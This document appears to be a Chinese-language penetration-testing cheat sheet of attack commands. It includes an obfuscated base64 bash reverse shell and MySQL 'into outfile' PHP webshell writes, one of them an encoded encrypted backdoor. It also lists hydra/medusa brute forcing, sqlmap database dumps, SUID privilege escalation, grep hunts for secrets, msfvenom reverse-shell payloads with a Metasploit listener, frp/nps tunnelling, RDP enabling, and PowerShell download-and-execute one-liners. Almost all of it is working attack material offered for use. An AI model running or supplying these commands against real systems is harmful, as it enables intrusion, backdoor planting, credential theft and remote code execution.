# 常用命令速查

## Shell

### java反弹shell

- java.lang.Runtime.exec() Payload：https://www.bugku.net/runtime-exec-payloads/

```bash
# /bin/bash -i >& /dev/tcp/192.168.35.152/7777 0>&1
bash -c '{echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA==}|{base64,-d}|{bash,-i}'
```

### ssh无记录shell

```
 ssh -T root@1.1.1.1 /usr/bin/bash -i
```

### python交互shell

```
python2 -c 'import pty;pty.spawn("/bin/sh")'
```

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

### 图片马制作

```
copy 1.jpg/b+1.php/a 2.jpg
```

## 按首字母排序

### AlliN

```# Arjun
# 按域名爬取
python AlliN.py --host $host -m subscan --project $project --timeout 6

# 按文件爬取
python AlliN.py -f domain.txt
```

### Arjun

```SHELL
# Scan a single URL
arjun -u https://api.example.com/endpoint

# Specify HTTP method
arjun -u https://api.example.com/endpoint -m POST

# Import targets
arjun -i targets.txt

# Export result
arjun -u https://api.example.com/endpoint -oJ result.json
-----------------
-oJ result.json
-oT result.txt
-oB 127.0.0.1:8080
```

### dirsearch

```
# 选项
-u 目标
-e 文件扩展名
-x 排除状态码结果
-w 指定字段
-r 递归扫描
-R 设置递归级别
-t 设置线程数（50-100）
-c cookie
```

```python
# 默认字典
python3 dirsearch.py -u https://target
```

```python
# 自定义字典
python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist
```

```python
# 配置代理
python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080

python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://1.1.1.1:8080
```

### dirmap

```python
# 单目标
python dirmap.py -i https://target.com -lcf
python dirmap.py -i 192.168.1.1 -lcf

# 子网
python dirmap.py -i 192.168.1.0/24 -lcf

# 网络范围
python dirmap.py -i 192.168.1.1-192.168.1.100 -lcf

# 文件读取
python dirmap.py -iF targets.txt -lcf
```

### EHole

```shell
# 系统指纹探测
# 本地识别
EHole -l url.txt   //URL地址需带上协议,每行一个

# FOFA识别
EHole -f 192.168.1.1/24  //支持单IP或IP段

# 结果输出
EHole -l url.txt -json export.json  //结果输出至export.json文件
```

### ENScan_GO

```SHELL
# 企业信息收集
ENScanPublic_amd64_linux -n 小米

# 备案信息获取
ENScanPublic_amd64_linux -n 小米  -field website
```

### find

```
# 查看拥有suid权限的文件
find / -perm -u=s -type f 2>/dev/null
```

```
# find结合set权限位提权
find /usr/bin/vim -exec "whoami" \;
```

```
# 全盘查找含有 flag 的文件
grep flag -r /
```

```
# 查找备份压缩包文件
find / -name *.tar.gz或find / -name *.zip
```

```
# 查找包含关键字的文件
find /etc -type f | xargs -I {} grep -l server {}
```

Linux找目录

```
# 写文件（www同目录）
find /root -name www|while read file;do sh -c "echo $file">$(dirname $file)/dir.txt;done 
# 写文件（www目录下）
find /root -name www|while read file;do sh -c "echo $file">$file/dir.txt;done 
```

```
# 删文件（www同目录）
find /root -name www|while read file;do sh -c "rm $(dirname $file)/dir.txt";done
# 删文件（www目录下）
find /root -name www|while read file;do sh -c "rm $file/dir.txt";done
```

Windows找目录

```
# 写文件（www同目录）
for /f %i in ('dir /s /b C:\Users\whoami\www.txt') do (echo %i > %i\..\dir.txt)
# 写文件（www目录下）
for /f %i in ('dir /s /b C:\Users\whoami\www') do (echo %i > %i\dir.txt)
```

```
# 删文件（www同目录）
for /f %i in ('dir /s /b C:\Users\whoami\www.txt') do (del %i\..\dir.txt)
# 删文件（www目录下）
for /f %i in ('dir /s /b C:\Users\whoami\www') do (del %i\dir.txt)
```

### fscan

```
fscan -hf hosts.txt --nopoc -t 100
```

```
fscan.exe -h 192.168.1.1/24  (默认使用全部模块)
fscan.exe -h 192.168.1.1/16 -p 8000-9000 (指定端口扫描)
fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)
```

### grep

```
grep -E "([0-9]{1,3}[\.]){3}[0-9]{1,3}" -r / --color=auto
```

```
grep -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" -r xxx --color=auto
```

```
grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" fold/
```

```
grep -ohr -E "https?://[a-zA-Z0-9\.\/_&=@$%?~#-]*" /app/ |sort|uniq >> test.txt
```

### hping3

重要端口

```
21,22,23,53,80,111,389,443,445,512,873,1433,1521,2049,2181,2375,3306,3389,4848,5432,5601,5672,5900,5984,6379,7001,8000-9000,9060,9092,9200,9300,10000,10051,11211.20880,27017,28017,50030,50070
```

```
8080,8081,8089,8090,8095,8161,8888,8983,9000
```

```
hping3 -S 1.1.1.1 --scan 1-65535
```

### hydra

```
# 选项
-l 指定的用户名 -L 用户名字典
-p 指定密码 -P 密码字典
-s 指定端口 
-o 输出文件
-t 任务数默认16
-f 爆破成功一个就停止
-v 报错日志详细 -V 攻击日志
```

```
hydra -L /root/user.txt -P pass.txt 1.1.1.1 mysql
```

```
hydra -L /root/user.txt -P pass.txt 1.1.1.1 ssh -s 22 -t 4
```

```
hydra -L /root/user.txt -P pass.txt 1.1.1.1 rdp -V
```

```
hydra -L /root/user.txt -P pass.txt 1.1.1.1 smb -vV
```

```
hydra -L /root/user.txt -P pass.txt ftp://1.1.1.1
```

### ksubdomain

```shell
# 使用内置字典爆破
ksubdomain -d seebug.org

# 使用字典爆破域名
ksubdomain -d seebug.org -f subdomains.dict

# 字典里都是域名，可使用验证模式
ksubdomain -f dns.txt -verify
```

### mysql

不登录直接执行sql语句

```
mysql -uroot -ppassword test -e "select now()" -N > test.txt
mysql -uroot -e "show databases;" > test.txt
```

getshell

```
show variables like '%secure%'    
select '<?php eval($_POST[xxx]) ?>' into outfile '/var/www/xx.php';  
select '<?php eval($_POST[xx]) ?>' into dumpfile '/var/www/xx.php';  
```

```
set global general_log=on;  
set global general_log_file='/var/www/1.php';  
select '<?php eval($_POST[s6]) ?>';
```

```
select '<?php file_put_contents("index.php",base64_decode("Jmx0Oz9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IA0KCSRfU0VTU0lPTlsmIzM5O2smIzM5O109JGtleTsNCgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsNCglpZighZXh0ZW5zaW9uX2xvYWRlZCgmIzM5O29wZW5zc2wmIzM5OykpDQoJew0KCQkkdD0iYmFzZTY0XyIuImRlY29kZSI7DQoJCSRwb3N0PSR0KCRwb3N0LiIiKTsNCgkJDQoJCWZvcigkaT0wOyRpJmx0O3N0cmxlbigkcG9zdCk7JGkrKykgew0KICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgDQogICAgCQkJfQ0KCX0NCgllbHNlDQoJew0KCQkkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCgl9DQogICAgJGFycj1leHBsb2RlKCYjMzk7fCYjMzk7LCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319DQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7DQo/Jmd0Ow0K"));?>' into outfile 'C:/www/index.php';
```

### medusa

```
# 选项
-h 目标名或IP  -H 目标列表
-u 用户名 -U 用户名字典
-p 密码 -P 密码字典 -f 爆破成功停止 -M 指定服务 -t 线程
-n 指定端口 -e ns 尝试空密码和用户名密码相同
```

```
medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql
```

```
medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql
```

### nmap

- 内网尽量不要使用nmap，用hping3代替

```
# 选项
-sn 只做 PING 扫描，不做端口扫描
-sV 探测开放的端口的系统/服务信息
-sP PING 扫描（打印出对 PING 扫描做出响应的主机，不进行进一步测试，无法用于端口扫描）
-sT TCP Connect 扫描
-sS TCP SYN 扫描
-sU UDP 扫描

--script=<Lua scripts> 指定脚本名称
```

```
nmap -sn 1.1.1.0/24
```

```
nmap -sV 1.1.1.1 -p 8080
```

```
nmap -p445 1.1.1.1 --script smb-vuln-ms17-010
```

```
nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 -iL ip.txt -oX output.xml
```

### OneForAll

```python
python oneforall.py --target example.com run
python oneforall.py --targets ./example.txt run
```

### sqlmap

```
# 选项
--file-read=RFILE   从后端的数据库管理系统文件系统读取文件
--dump            	转储数据库表项
```

```
python sqlmap.py -u "https://www.xxx.com/post.php?id=1" --proxy "http://127.0.0.1:1080"
```

```
python sqlmap.py  -u "http://www.xxx.com" –cookie "id=11" --level 2
```

```
python sqlmap.py -u "www.xxxx.com/product/detail/id/3*.html" --dbms=mysql -v 3 
```

```
python sqlmap.py -u "http://www.xxx.com/post.php?id=1"  --dbms mysql  --dbs
```

```
python sqlmap.py -u "http://www.xxx.com/post.php?id=1"  --dbms mysql  -D test --tables
```

```
python sqlmap.py -u "http://www.xxx.com/post.php?id=1"  --dbms mysql  -D test -T admin –-columns
```

```
python sqlmap.py -u "http://www.xxx.com/post.php?id=1"  --dbms mysql -D test -T admin -C "username,password" --dump
```

```
python sqlmap.py -r "c:\url.txt" -p id –dbms mysql –file-read="C:/example.exe"
```

### TideFinger

```
python TideFinger.py -u http://192.168.0.1:8080/
```

### Xray

```shell
# 网络扫描
.\xray_windows_386.exe webscan --listen 127.0.0.1:7777 --html-output xray.html

# 服务扫描
.\xray_windows_386.exe servicescan --target 1.1.1.1:8080

# 指定插件
xray webscan --plugins cmd-injection,sqldet --url http://example.com
xray webscan --plugins cmd-injection,sqldet --listen 127.0.0.1:7777
```

## 内网信息收集

### Windows

### Linux

## 内网穿透代理

### Neo-reGeorg

1. 攻击机生成tunnel.(aspx|ashx|jsp|jspx|php) 并上传Web Server 1.1.1.1

```
python neoreg.py generate -k password
```

2. 攻击机通过neoreg.py连接Web Server

```
python neoreg.py -k password -u http://1.1.1.1/tunnel.jsp
```

3. 配置本地代理访问内网服务

```
SOCKS5	127.0.0.1	1080
```

### ssh

将对A:X的访问转变成对C:Z的访问

```
ssh -L 主机A端口X:主机C:主机C端口Z -N -f username@hostname

# 例如
ssh -L 27689:192.168.20.100:27689 -N -f root@172.16.0.10
```

### nps

1. 攻击机启动服务，新增client，新增socks5

```
sudo -s
./nps install
./nps
```

2. 上传nps client，根据给出的命令连接nps server

```
# Windows客户端
.\npc.exe -server=1.1.1.1:8024 -vkey=ihmtyta4i4f3rm3z -type=tcp

# Linux客户端
.\npc -server=1.1.1.1:8024 -vkey=ihmtyta4i4f3rm3z -type=tcp
```

### frp

1. 根据配置文件frps.ini运行服务端

```
[common]
bind_port = 7000
dashboard_port = 7500
dashboard_user = admin
dashboard_pwd = <your-password-here>
```

```
./frps -c frps.ini  
```

2. 根据配置文件frpc.ini运行客户端

```
[common]
server_addr = <your-vps-ip-here>
server_port = 7000

[msf]
type = tcp
local_ip = 127.0.0.1
local_port = 4444
remote_port = 9001
```

```
./frpc -c frpc.ini  
```

3. msf生成木马/behinder3生成木马

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-vps-ip-here> LPORT=9001 -f exe > shell.exe
```

4. msf监听反弹shell

```
msf > use exploit/multi/handler

# 监听windows shell
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp

# 监听behinder3 shell
msf exploit(multi/handler) > set PAYLOAD java/meterpreter/reverse_tcp

msf exploit(multi/handler) > set LHOST 127.0.0.1

msf exploit(multi/handler) > set LPORT 4444

msf exploit(multi/handler) > run
```

## 内网权限提升



## 内网渗透工具

### Mimikatz

### Metasploit

### CobaltStrike

## 内网其他命令

### 3389端口开放

```
wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1
wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
net start TermService
```

### powershell文件下载

```
powershell (new-object System.Net.WebClient).DownloadFile('http://1.1.1.1/test.exe','C:\test.exe');start-process 'C:\test.exe'
```

```
powershell (new-object System.Net.WebClient).DownloadFile('http://1.1.1.1/test.exe','test.exe')
```

```
Invoke-Expression (New-Object Net.WebClient).DownloadString("http://1.1.1.1/test.ps1")
```

```
echo (new-object System.Net.WebClient).DownloadFile('http://1.1.1.1/test.exe','C:/test.exe')| powershell -
```

### 